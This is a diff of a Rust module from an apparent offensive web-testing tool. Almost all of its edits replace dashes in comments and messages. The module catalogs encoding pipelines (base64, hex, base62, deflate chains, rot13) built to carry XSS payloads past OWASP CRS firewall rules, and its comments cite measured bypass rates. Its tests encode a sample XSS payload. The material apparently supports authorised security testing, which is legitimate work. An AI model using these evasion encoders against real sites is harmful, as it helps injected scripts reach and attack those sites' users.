@@ -1,4 +1,4 @@
-//! App-transform encodings — the **WAF-opaque delivery** axis for `exploit`.
+//! App-transform encodings (the **WAF-opaque delivery** axis for `exploit`).
 //!
 //! The payload-token axis (which bytes) and reflection-context axis (where they
 //! land) are exhausted against a signature WAF: OWASP CRS blocks every
@@ -15,8 +15,8 @@
 //! XSS signature; the app decodes it to live markup and it executes. Empirically
 //! (`bench/waf-zoo/reflect-origin`, CRS 4.x PL1–PL4): base64 and hex blobs of
 //! `<img src=x onerror=alert(1)>` pass with anomaly score ~3 (threshold 5) and
-//! execute, while the SAME payload raw — and the encodings CRS *does* model
-//! (`\uXXXX`, `&#60;`, double-URL) — are 403'd. The exploit surface is the
+//! execute, while the SAME payload raw, and the encodings CRS *does* model
+//! (`\uXXXX`, `&#60;`, double-URL), are 403'd. The exploit surface is the
 //! transform the WAF can't model, not its regex engine.
 //!
 //! This module is the encoder half: given the operator-declared app transform
@@ -27,12 +27,12 @@
 //! **Transforms are pipelines, not opaque functions.** Each catalog entry is a
 //! list of reversible [`Stage`]s applied innermost-first, so a chain (`b64x2`),
 //! a compression idiom (`zb64` = deflate→base64), and its PL4-clean twin (`zhex`
-//! = deflate→hex) are all the *same* machinery with different stage lists — one
+//! = deflate→hex) are all the *same* machinery with different stage lists, one
 //! `deflate` primitive, one base64 primitive, composed by data. The set is
 //! Tier-B data: add an [`AppTransform`] row (a new stage list) to model another
 //! app decoder; add a [`Stage`] only for a genuinely new primitive.
 
-/// One reversible encoding stage — the atom transforms are built from. A WAF
+/// One reversible encoding stage, the atom transforms are built from. A WAF
 /// that models every base-N transform individually still can't reverse a *chain*
 /// of them, or compression, so composing these is what defeats it.
 ///
@@ -42,39 +42,39 @@
 /// emits binary and is therefore always chained into a following text stage.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub(crate) enum Stage {
-    /// zlib (RFC 1950) DEFLATE — the URL-state-compression idiom (pako /
+    /// zlib (RFC 1950) DEFLATE, the URL-state-compression idiom (pako /
     /// lz-string). Binary output; a signature WAF has no transform to inflate it.
     Deflate,
-    /// RAW DEFLATE (RFC 1951) — no zlib header/checksum. The `pako.inflateRaw`
+    /// RAW DEFLATE (RFC 1951), no zlib header/checksum. The `pako.inflateRaw`
     /// idiom that dominates JS SPAs (and `zlib.decompress(data, -15)` server-
     /// side). A distinct decoder class from zlib: a WAF that models neither can
     /// inflate it. Binary output.
     DeflateRaw,
-    /// gzip (RFC 1952) framing — `gzip.decompress` / `zlib.gunzip` / a gzipped
+    /// gzip (RFC 1952) framing: `gzip.decompress` / `zlib.gunzip` / a gzipped
     /// body field. Yet another compression a signature WAF cannot reverse.
     /// Binary output.
     Gzip,
     /// Standard base64 (`+`/`/`/`=` alphabet). NB: those three chars are exactly
-    /// what CRS PL4 rule 942432 counts — prefer a clean-alphabet stage at PL4.
+    /// what CRS PL4 rule 942432 counts (prefer a clean-alphabet stage at PL4).
     B64,
     /// URL-safe base64, no padding (`-_`, JWT/URL convention); the origin
     /// restores padding before decoding.
     B64Url,
-    /// Lowercase hex, no separators — a PL4-clean `[0-9a-f]` alphabet.
+    /// Lowercase hex, no separators (a PL4-clean `[0-9a-f]` alphabet).
     Hex,
     /// Lowercase hex with a `0x` prefix the app strips before decoding.
     Hex0x,
     /// RFC4648 base32, uppercase, `=` padded.
     B32,
-    /// Base62 (`0-9A-Za-z`) — a PURE-ALPHANUMERIC bignum encoding: the *maximally
+    /// Base62 (`0-9A-Za-z`), a PURE-ALPHANUMERIC bignum encoding: the *maximally
     /// clean* alphabet, ZERO special characters for any CRS rule to count, and
     /// denser than hex (≈5.95 vs 4 bits/char → shorter blobs, less length-anomaly
     /// surface). Used by URL shorteners / short-ID schemes. No external dep.
     B62,
     /// ROT13 over ASCII letters; preserves shape/length yet carries no XSS
-    /// keyword — proof "opaque" need not mean "high-entropy".
+    /// keyword (proof "opaque" need not mean "high-entropy").
     Rot13,
-    /// Bitcoin base58 (no `0OIl`, no `+`/`/`) — a clean-alphabet bignum encoding.
+    /// Bitcoin base58 (no `0OIl`, no `+`/`/`) (a clean-alphabet bignum encoding).
     B58,
 }
 
@@ -144,7 +144,7 @@ impl AppTransform {
 /// application decode, expressed as a [`Stage`] pipeline. `rot13` is included as
 /// a structural opposite of base/hex (it preserves length and ASCII shape yet
 /// still slips CRS, because `<vzt fep=k ...>` matches no known-tag/event-handler
-/// signature) — a useful proof that "opaque" need not mean "high-entropy". The
+/// signature), a useful proof that "opaque" need not mean "high-entropy". The
 /// composite rows (`zb64`, `zhex`, `b64x2`) are multi-stage pipelines, not
 /// bespoke functions: a WAF that reverses every single transform still can't
 /// reverse a chain.
@@ -192,13 +192,13 @@ pub(crate) const APP_TRANSFORMS: &[AppTransform] = &[
     AppTransform {
         name: "zb64",
         ctx: "zb64",
-        note: "app base64-decodes then zlib-inflates (pako/lz-string URL-state compression) — a signature WAF cannot inflate DEFLATE",
+        note: "app base64-decodes then zlib-inflates (pako/lz-string URL-state compression), a signature WAF cannot inflate DEFLATE",
         stages: &[Stage::Deflate, Stage::B64],
     },
     AppTransform {
         name: "zhex",
         ctx: "zhex",
-        note: "app hex-decodes then zlib-inflates — compression with a PL4-CLEAN [0-9a-f] alphabet; bypasses CRS PL4 where zb64's +/= chars are flagged (empirically 100% vs 27%)",
+        note: "app hex-decodes then zlib-inflates, compression with a PL4-CLEAN [0-9a-f] alphabet; bypasses CRS PL4 where zb64's +/= chars are flagged (empirically 100% vs 27%)",
         stages: &[Stage::Deflate, Stage::Hex],
     },
     AppTransform {
@@ -210,19 +210,19 @@ pub(crate) const APP_TRANSFORMS: &[AppTransform] = &[
     AppTransform {
         name: "b64x2",
         ctx: "b64x2",
-        note: "app base64-decodes twice (a decode chain — breaks a WAF that reverses only one layer)",
+        note: "app base64-decodes twice (a decode chain, breaks a WAF that reverses only one layer)",
         stages: &[Stage::B64, Stage::B64],
     },
     AppTransform {
         name: "b62",
         ctx: "b62",
-        note: "app base62-decodes the value (URL-shortener / short-ID alphabet) — pure alphanumeric, ZERO special chars (the cleanest blob at CRS PL4)",
+        note: "app base62-decodes the value (URL-shortener / short-ID alphabet), pure alphanumeric, ZERO special chars (the cleanest blob at CRS PL4)",
         stages: &[Stage::B62],
     },
     AppTransform {
         name: "zrawb64",
         ctx: "zrawb64",
-        note: "app base64-decodes then RAW-inflates (pako.inflateRaw — no zlib header; the dominant JS-SPA URL-state idiom a WAF cannot model)",
+        note: "app base64-decodes then RAW-inflates (pako.inflateRaw, no zlib header; the dominant JS-SPA URL-state idiom a WAF cannot model)",
         stages: &[Stage::DeflateRaw, Stage::B64],
     },
 ];
@@ -243,7 +243,7 @@ pub(crate) fn resolve(spec: &str) -> Result<Vec<&'static AppTransform>, String> 
     for tok in spec.split(',').map(str::trim).filter(|t| !t.is_empty()) {
         if by_name(tok).is_none() {
             return Err(format!(
-                "unknown app-transform `{tok}` — valid: {} (or `all`)",
+                "unknown app-transform `{tok}`: valid: {} (or `all`)",
                 all_names().join(", ")
             ));
         }
@@ -253,7 +253,7 @@ pub(crate) fn resolve(spec: &str) -> Result<Vec<&'static AppTransform>, String> 
     }
     if requested.is_empty() {
         return Err(format!(
-            "no app-transform selected — valid: {} (or `all`)",
+            "no app-transform selected, valid: {} (or `all`)",
             all_names().join(", ")
         ));
     }
@@ -268,7 +268,7 @@ pub(crate) fn by_name(name: &str) -> Option<&'static AppTransform> {
     APP_TRANSFORMS.iter().find(|t| t.name == name)
 }
 
-/// Every transform name, in catalog order — for help text and error messages.
+/// Every transform name, in catalog order (for help text and error messages).
 pub(crate) fn all_names() -> Vec<&'static str> {
     APP_TRANSFORMS.iter().map(|t| t.name).collect()
 }
@@ -318,7 +318,7 @@ impl Stage {
     }
 }
 
-/// Every chain-stage token, in declaration order — for help text and errors.
+/// Every chain-stage token, in declaration order (for help text and errors).
 pub(crate) fn stage_token_names() -> Vec<&'static str> {
     [
         Stage::Deflate,
@@ -339,21 +339,21 @@ pub(crate) fn stage_token_names() -> Vec<&'static str> {
 }
 
 /// Count the characters in `s` that CRS's restricted-character rules flag (the
-/// PL4 "special character anomaly" surface — base64's `+`/`/`/`=`, a `0x`-style
+/// PL4 "special character anomaly" surface, base64's `+`/`/`/`=`, a `0x`-style
 /// literal, etc.). A pure-alphanumeric blob scores 0; this is the measured,
-/// data-driven form of the "clean alphabet bypasses PL4" finding — the encoder's
+/// data-driven form of the "clean alphabet bypasses PL4" finding, the encoder's
 /// PL4 risk is now computable, not folklore. ASCII-alphanumeric and the bignum
 /// alphabets (no padding/sign chars) are clean; everything else counts.
 pub(crate) fn pl4_special_chars(s: &str) -> usize {
     s.chars().filter(|c| !c.is_ascii_alphanumeric()).count()
 }
 
-/// Parse a `--transform-chain` spec — a dot-separated pipeline of stage tokens,
+/// Parse a `--transform-chain` spec, a dot-separated pipeline of stage tokens,
 /// applied innermost-first (`deflate.hex` ⇒ `hex(deflate(payload))`, the app
 /// hex-decodes then zlib-inflates). This is the operator-facing generalisation
 /// of the named catalog: any clean-alphabet composition the engagement needs,
 /// not just the shipped rows. Fails closed (naming the offending token and the
-/// valid set) on an unknown stage, an empty spec, or — the key audit guard — a
+/// valid set) on an unknown stage, an empty spec, or, the key audit guard, a
 /// pipeline that ends in a binary stage (`deflate`), which would otherwise feed
 /// the app raw bytes and panic the UTF-8 finalisation in [`encode_stages`].
 pub(crate) fn parse_chain(spec: &str) -> Result<Vec<Stage>, String> {
@@ -364,7 +364,7 @@ pub(crate) fn parse_chain(spec: &str) -> Result<Vec<Stage>, String> {
             Some(s) => stages.push(s),
             None => {
                 return Err(format!(
-                    "unknown transform-chain stage `{tok}` — valid: {} (dot-separated, \
+                    "unknown transform-chain stage `{tok}`: valid: {} (dot-separated, \
                      innermost first, e.g. `deflate.hex`)",
                     stage_token_names().join(", ")
                 ));
@@ -373,7 +373,7 @@ pub(crate) fn parse_chain(spec: &str) -> Result<Vec<Stage>, String> {
     }
     if stages.is_empty() {
         return Err(format!(
-            "empty transform-chain — give a dot-separated pipeline, e.g. `deflate.hex` \
+            "empty transform-chain, give a dot-separated pipeline, e.g. `deflate.hex` \
              (valid stages: {})",
             stage_token_names().join(", ")
         ));
@@ -382,7 +382,7 @@ pub(crate) fn parse_chain(spec: &str) -> Result<Vec<Stage>, String> {
         && last.produces_binary()
     {
         return Err(format!(
-            "transform-chain must end in a text stage — `{}` emits binary bytes the app \
+            "transform-chain must end in a text stage: `{}` emits binary bytes the app \
              cannot read as a value; append an encoder, e.g. `{spec}.hex` or `{spec}.b64`",
             last.token()
         ));
@@ -396,7 +396,7 @@ pub(crate) fn parse_chain(spec: &str) -> Result<Vec<Stage>, String> {
 // another text stage (the decode chains). base64/hex are inlined in `apply`;
 // the multi-line primitives live here.
 
-/// zlib (RFC 1950) DEFLATE of the input — zlib framing so Python's stdlib
+/// zlib (RFC 1950) DEFLATE of the input, zlib framing so Python's stdlib
 /// `zlib.decompress` (the overwhelmingly common server side) reads it directly.
 /// Writes to a `Vec`, so every I/O call is infallible.
 fn deflate(input: &[u8]) -> Vec<u8> {
@@ -408,7 +408,7 @@ fn deflate(input: &[u8]) -> Vec<u8> {
     e.finish().expect("ZlibEncoder finish on Vec is infallible")
 }
 
-/// RAW DEFLATE (RFC 1951) — no zlib header or adler32 checksum. Matches
+/// RAW DEFLATE (RFC 1951), no zlib header or adler32 checksum. Matches
 /// `pako.inflateRaw` (JS) and `zlib.decompress(data, -15)` (Python). The bare
 /// compressed stream a signature WAF cannot inflate, with no framing to fingerprint.
 fn deflate_raw(input: &[u8]) -> Vec<u8> {
@@ -421,7 +421,7 @@ fn deflate_raw(input: &[u8]) -> Vec<u8> {
         .expect("DeflateEncoder finish on Vec is infallible")
 }
 
-/// gzip (RFC 1952) framing — gzip magic + CRC32. Matches `gzip.decompress` /
+/// gzip (RFC 1952) framing, gzip magic + CRC32. Matches `gzip.decompress` /
 /// `zlib.gunzip` / `pako.ungzip`. NB: gzip embeds an OS byte; flate2 fixes it to
 /// a constant, so the output is deterministic for a given input (round-trip and
 /// dedup stay stable).
@@ -434,10 +434,10 @@ fn gzip(input: &[u8]) -> Vec<u8> {
     e.finish().expect("GzEncoder finish on Vec is infallible")
 }
 
-/// Base62 (`0-9A-Za-z`, GMP digit order) — big-endian base-256 → base-62 via
+/// Base62 (`0-9A-Za-z`, GMP digit order), big-endian base-256 → base-62 via
 /// repeated division, leading zero bytes mapped to leading `0`s. The same
 /// bignum scheme as base58 but PURE ALPHANUMERIC: no `+`/`/`/`=`/sign chars, so
-/// [`pl4_special_chars`] of its output is 0 — the cleanest possible blob for a
+/// [`pl4_special_chars`] of its output is 0, the cleanest possible blob for a
 /// character-counting WAF rule. No external dependency.
 fn b62_encode(data: &[u8]) -> String {
     const ALPHABET: &[u8; 62] = b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
@@ -478,7 +478,7 @@ fn rot13(input: &[u8]) -> Vec<u8> {
         .collect()
 }
 
-/// RFC4648 base32 (uppercase, `=` padded) — no external dep. Encodes each
+/// RFC4648 base32 (uppercase, `=` padded), no external dep. Encodes each
 /// 5-byte group into 8 chars, padding the final partial group.
 fn b32_encode(data: &[u8]) -> String {
     const ALPHABET: &[u8; 32] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
@@ -542,7 +542,7 @@ mod tests {
 
     const P: &str = "<img src=x onerror=alert(1)>";
 
-    /// Encode the sample payload through a named catalog transform — exercises
+    /// Encode the sample payload through a named catalog transform, exercises
     /// the real public path (`AppTransform::encode`) the operator hits.
     fn enc(name: &str) -> String {
         by_name(name).expect("known transform").encode(P)
@@ -600,13 +600,13 @@ mod tests {
         assert_eq!(encode_stages(&[Stage::Rot13], &e), P);
         // The signature keywords are gone from the encoded form.
         assert!(!e.contains("onerror") && !e.contains("alert") && !e.contains("img"));
-        // Structure (the non-letters) is preserved — that's the point.
+        // Structure (the non-letters) is preserved (that's the point).
         assert!(e.contains('<') && e.contains('=') && e.contains('>'));
     }
 
     #[test]
     fn b32_matches_known_vector() {
-        // RFC4648 test vectors — pins the hand-rolled stage primitive.
+        // RFC4648 test vectors (pins the hand-rolled stage primitive).
         assert_eq!(encode_stages(&[Stage::B32], "f"), "MY======");
         assert_eq!(encode_stages(&[Stage::B32], "fo"), "MZXQ====");
         assert_eq!(encode_stages(&[Stage::B32], "foo"), "MZXW6===");
@@ -666,7 +666,7 @@ mod tests {
         use flate2::read::ZlibDecoder;
         use std::io::Read;
         let e = enc("zhex");
-        // The whole point: a PL4-clean alphabet — only [0-9a-f], no +/= for CRS
+        // The whole point: a PL4-clean alphabet, only [0-9a-f], no +/= for CRS
         // to flag.
         assert!(
             e.bytes()
@@ -684,7 +684,7 @@ mod tests {
     fn zb64_and_zhex_share_one_deflate_differing_only_in_alphabet() {
         // The dedup invariant: both compression transforms run the SAME deflate
         // primitive and differ ONLY in the terminal text stage. Decoding each
-        // outer alphabet must yield byte-identical compressed streams — proof
+        // outer alphabet must yield byte-identical compressed streams, proof
         // there is one `deflate`, not two divergent hand-rolled copies.
         use base64::Engine;
         let from_b64 = base64::engine::general_purpose::STANDARD
@@ -743,7 +743,7 @@ mod tests {
             .decode(&once)
             .expect("inner base64");
         assert_eq!(String::from_utf8(twice).unwrap(), P);
-        // After ONE decode the value is still an opaque base64 blob — a WAF that
+        // After ONE decode the value is still an opaque base64 blob, a WAF that
         // peels a single layer gains no XSS signature.
         let after_one = String::from_utf8(once).unwrap();
         assert!(!after_one.contains('<') && !after_one.contains("alert"));
@@ -859,7 +859,7 @@ mod tests {
     #[test]
     fn pl4_special_chars_is_the_measured_alphabet_contract() {
         // The measured form of the PL4 alphabet finding. Pure-alphanumeric /
-        // bignum alphabets score 0 — the cleanest at PL4.
+        // bignum alphabets score 0 (the cleanest at PL4).
         for clean in ["b62", "hex", "b58"] {
             assert_eq!(
                 pl4_special_chars(&enc(clean)),
@@ -868,10 +868,10 @@ mod tests {
             );
         }
         // base64 (`+`/`/` + `=` padding) and padded base32 (`=`) DETERMINISTICALLY
-        // carry special chars CRS's character rules can count — measurably > 0,
+        // carry special chars CRS's character rules can count, measurably > 0,
         // which is why they bypass PL4 less reliably than the clean trio. (b64url
         // is intentionally NOT asserted here: its `-`/`_` only appear when a
-        // 6-bit group hits index 62/63, so its count is payload-dependent — the
+        // 6-bit group hits index 62/63, so its count is payload-dependent, the
         // very reason its bench bypass sits at ≈89%, between clean and base64.)
         for dirty in ["b64", "b32"] {
             assert!(
@@ -899,7 +899,7 @@ mod tests {
 
     #[test]
     fn parse_chain_matches_the_named_catalog_equivalents() {
-        // The chain grammar must reproduce the hand-named composites exactly —
+        // The chain grammar must reproduce the hand-named composites exactly 
         // proof the catalog rows ARE just pinned chains. `deflate.hex` ≡ zhex,
         // `deflate.b64` ≡ zb64, `b64.b64` ≡ b64x2.
         for (chain, name) in [
@@ -951,7 +951,7 @@ mod tests {
             );
         }
         // And the validated chains never panic encode_stages (the invariant the
-        // guard enforces) — exercise a few terminal-encoder shapes.
+        // guard enforces) (exercise a few terminal-encoder shapes).
         for ok in ["deflate.hex", "deflate.b64", "deflate.b58", "rot13", "b32"] {
             let _ = encode_stages(&parse_chain(ok).unwrap(), P); // must not panic
         }
@@ -969,7 +969,7 @@ mod tests {
     fn pipeline_generalises_beyond_the_catalog() {
         // The Stage machinery is general: an ad-hoc clean-alphabet chain the
         // catalog doesn't ship (deflate → base58) still round-trips. Proves the
-        // axis is composition, not a fixed list — a future `--transform-chain`
+        // axis is composition, not a fixed list, a future `--transform-chain`
         // can mix primitives without new bespoke encoders.
         let e = encode_stages(&[Stage::Deflate, Stage::B58], P);
         // base58-decode then zlib-inflate.
@@ -1055,7 +1055,7 @@ mod tests {
     #[test]
     fn every_transform_has_a_nonempty_stage_pipeline() {
         // A row with no stages would emit the raw payload (a signature the WAF
-        // catches) — fail closed against that.
+        // catches) (fail closed against that).
         for t in APP_TRANSFORMS {
             assert!(
                 !t.stages.is_empty(),
@@ -1068,7 +1068,7 @@ mod tests {
     #[test]
     fn every_transform_has_a_matching_origin_ctx() {
         // The ctx each transform names must be one the lab origin actually
-        // decodes — guards against a transform whose decoder doesn't exist.
+        // decodes (guards against a transform whose decoder doesn't exist).
         let origin_ctxs = [
             "b64", "hex", "b32", "rot13", "jsesc", "entity", "zb64", "zhex", "b58", "b64x2", "b62",
             "zrawb64",
